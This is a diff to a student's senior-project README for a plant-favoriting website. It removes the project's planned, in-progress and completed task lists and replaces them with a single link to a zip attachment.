@@ -6,35 +6,4 @@ The user can also sign in to be able to favorite certain plants so that they do 
 
 The reasoning behind this idea is that I have spent considerable time in the agriculture sector, and I figured I can mold that with my CS knowledge.
 
-# Planned 
-
-* Add a menu to home page that takes users to all plants, favorites from all users, and maybe that location option
-* Customize search bar to fit the theme
-* Add functionality to the search bar that allows users to search for plants
-* Allow users to be able to share their favorites via a favorites page
-* Allow users to create multiple favorite lists
-* Add profile image and allow users to edit them 
-* Access user’s location to recommend plants to grow
-* Figure how how to get user’s location and relate it to the location of plants
-* Notifications to remind user to take care of their plants
-* Option: allow users to add plants
-* Make a javascript file with all the necessary features to allow users to add plants
-
-# Currently Working On
-
-* Layout of home page
-* Create a user’s page that lets them edit their info and see favorites
-* Add more plants
-* Finish up what I want the plant pages to look like
-* Implement favorites by allowing users to create them
-
-# Done
-
-* General plan for what I want to do
-* Overall theme
-* An ever-evolving UI that shows what I want it to look like
-* Frontend and backend
-* Added a database with the needed tables
-* Users can login and signup
-* User page that shows info, favorites, and option to add new plant
-* The look and info of plant pages
+# [senior_proj.zip](https://github.com/user-attachments/files/26131001/senior_proj.zip)
